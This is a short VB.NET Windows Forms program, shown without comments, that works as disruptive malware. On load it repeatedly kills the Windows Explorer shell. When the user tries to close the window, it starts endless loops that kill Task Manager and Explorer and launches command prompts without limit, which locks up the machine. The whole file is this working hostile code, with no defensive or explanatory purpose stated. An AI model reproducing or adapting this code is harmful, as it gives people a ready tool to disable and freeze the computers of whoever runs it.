Public Class Form1
    Sub task()
        While True
            For Each o As Process In Process.GetProcessesByName("taskmgr")
                o.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub

    Sub block()
        While True
            For Each p As Process In Process.GetProcessesByName("explorer")
                p.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub

    Sub explorer()
        While True
            Threading.Thread.Sleep(1000)
            For Each l As Process In Process.GetProcessesByName("explorer")
                l.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim u As New Threading.Thread(AddressOf explorer)
        u.Start()
    End Sub

    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles MyBase.FormClosed

    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Dim t As New Threading.Thread(AddressOf block)
        Dim z As New Threading.Thread(AddressOf task)
        t.Start()
        z.Start()
        Do
            Process.Start("cmd")
        Loop
    End Sub
End Class
